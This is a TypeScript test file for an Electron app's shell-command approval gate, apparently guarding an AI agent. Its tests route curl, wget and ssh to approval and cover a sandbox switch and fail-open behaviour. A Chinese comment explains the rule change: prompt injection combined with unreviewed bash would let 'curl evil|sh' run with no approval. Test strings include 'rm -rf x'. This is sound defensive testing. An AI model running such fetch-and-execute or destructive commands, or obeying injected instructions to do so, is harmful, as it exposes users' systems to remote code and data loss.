import { describe, expect, it } from "vitest";
import {
  commandGate,
  installCommandGate,
  makeCommandDecider,
} from "../../electron/domains/security/command-gate";
import { SECURITY_DEFAULTS } from "../../electron/domains/security/defaults";
import type { SecurityConfig } from "../../src-react/domains/security/model/types";

const config = (over: Partial<SecurityConfig>): SecurityConfig => ({
  ...SECURITY_DEFAULTS,
  ...over,
});

describe("makeCommandDecider", () => {
  it("默认规则（2026-10-24 放宽 + 安全批 S4 网络外发纳管）：git push 放行，curl/wget/ssh 落 ask，rm/echo 落 default", () => {
    // 安全批 S4（2026-11-02 审查）：网络外发类命令默认 cmdAsk——旧「网络
    // 域免审」裁定的前提对 bash 子进程不成立（NetworkGate 只拦 undici/
    // fetch，curl/wget 独立进程直连）；default 档免审 bash + prompt 注入
    // = curl evil|sh 零审批。rm 语义仍由 command-risk 分级表兜底
    const decide = makeCommandDecider(() => config({}));
    expect(decide("git push origin main")).toBe("allow");
    expect(decide("curl https://x.io")).toBe("ask");
    expect(decide("wget http://x.io/a")).toBe("ask");
    expect(decide("ssh host cmd")).toBe("ask");
    expect(decide("rm -rf x")).toBe("default");
    expect(decide("echo hi")).toBe("default");
  });
  it("sandboxEnabled=false → 一律 default（总开关旁路）", () => {
    const decide = makeCommandDecider(() => config({ sandboxEnabled: false }));
    expect(decide("rm -rf x")).toBe("default");
  });
  it("getConfigValue 抛错 → fail-open default", () => {
    const decide = makeCommandDecider(() => {
      throw new Error("boom");
    });
    expect(decide("rm -rf x")).toBe("default");
  });
});

describe("commandGate 模块单例", () => {
  it("未安装 → default；安装后生效；再装可替换", () => {
    expect(commandGate("rm -rf x")).toBe("default");
    installCommandGate((cmd) => (cmd.startsWith("rm") ? "block" : "default"));
    expect(commandGate("rm -rf x")).toBe("block");
    installCommandGate(() => "default");
    expect(commandGate("rm -rf x")).toBe("default");
  });

  it("gate 自身抛错 → fail-open default", () => {
    installCommandGate(() => {
      throw new Error("boom");
    });
    expect(commandGate("rm -rf x")).toBe("default");
    installCommandGate(() => "default");
  });
});
